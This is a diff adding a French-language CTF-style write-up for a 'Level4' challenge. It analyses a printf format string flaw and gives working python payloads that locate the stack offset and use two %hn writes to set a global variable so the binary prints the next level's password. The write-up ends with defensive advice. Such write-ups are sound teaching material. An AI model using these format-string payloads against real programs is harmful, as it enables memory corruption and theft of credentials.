@@ -1,0 +1,98 @@
+# Exploitation de Format String Avancée - Level4
+
+## Analyse du Programme
+
+Le programme contient deux fonctions principales qui présentent une vulnérabilité de format string :
+
+```c
+void n(void) {
+    char local_20c [520];
+    
+    fgets(local_20c, 0x200, stdin);
+    p(local_20c);
+    if (m == 0x1025544) {
+        system("/bin/cat /home/user/level5/.pass");
+    }
+    return;
+}
+
+void p(char *param_1) {
+    printf(param_1);  // Vulnérabilité ici - pas de format string spécifié
+    return;
+}
+```
+
+## Points Clés de Théorie
+
+1. **Vulnérabilité Format String**
+   - Même type de vulnérabilité que le level3
+   - La fonction `printf()` est appelée sans format string spécifié
+   - Permet d'écrire en mémoire de manière contrôlée
+
+2. **Variable Critique**
+   - Variable globale `m` à l'adresse `0x08049810`
+   - Condition : `m == 0x1025544` (16930116 en décimal)
+   - Si la condition est remplie, affiche le mot de passe de level5
+
+3. **Techniques d'Exploitation Avancées**
+   - Écriture d'une valeur sur 4 bytes (32 bits)
+   - Utilisation de `%hn` pour écrire sur 2 bytes (16 bits)
+   - Calcul précis des offsets et des valeurs à écrire
+
+## Étapes de l'Exploitation
+
+1. **Trouver l'Offset**
+   ```bash
+   python -c "print 'AAAA' + '%x '*12" | ./level4
+   ```
+   - Offset trouvé : 12
+   - AAAA sert de marqueur
+   - %x affiche les valeurs de la pile
+
+2. **Analyse de la Valeur à Écrire**
+   - Valeur cible : `0x1025544`
+   - Décomposition en deux parties de 2 bytes :
+     - Première partie : `0x0102` (258 en décimal)
+     - Deuxième partie : `0x5544` (21828 en décimal)
+
+3. **Construction de l'Exploit**
+   ```bash
+   python -c "print '\x12\x98\x04\x08\x10\x98\x04\x08' + '%250x%12\$hn%21570x%13\$hn'"
+   ```
+   - `\x12\x98\x04\x08\x10\x98\x04\x08` : Les deux adresses consécutives
+   - `%250x` : Écrit 250 caractères (258 - 8 pour les adresses)
+   - `%12\$hn` : Écrit sur 2 bytes à la première adresse
+   - `%21570x` : Écrit 21570 caractères (21828 - 258)
+   - `%13\$hn` : Écrit sur 2 bytes à la deuxième adresse
+
+## Explication Technique Détaillée
+
+### Arithmétique des Adresses
+- Adresse de `m` : `0x08049810`
+- Deuxième adresse : `0x08049812` (+2 bytes)
+- Cette séparation permet d'écrire la valeur sur 4 bytes en deux parties
+
+### Utilisation de %hn
+- `%hn` écrit le nombre de caractères imprimés sur 2 bytes (16 bits)
+- Permet d'écrire des valeurs plus grandes en les divisant
+- Plus précis que `%n` qui écrit sur 4 bytes
+
+### Calcul des Valeurs
+1. Première écriture :
+   - Valeur cible : 258 (0x0102)
+   - Soustraction de 8 (longueur des adresses)
+   - Résultat : 250 caractères à écrire
+
+2. Deuxième écriture :
+   - Valeur cible : 21828 (0x5544)
+   - Soustraction de 258 (caractères déjà écrits)
+   - Résultat : 21570 caractères à écrire
+
+## Sécurité
+
+Cette vulnérabilité illustre l'importance de :
+- Toujours spécifier un format string dans printf
+- Valider les entrées utilisateur
+- Protéger les variables critiques
+- Utiliser des mécanismes de protection comme ASLR et DEP
+- Attention aux permissions SUID des binaires
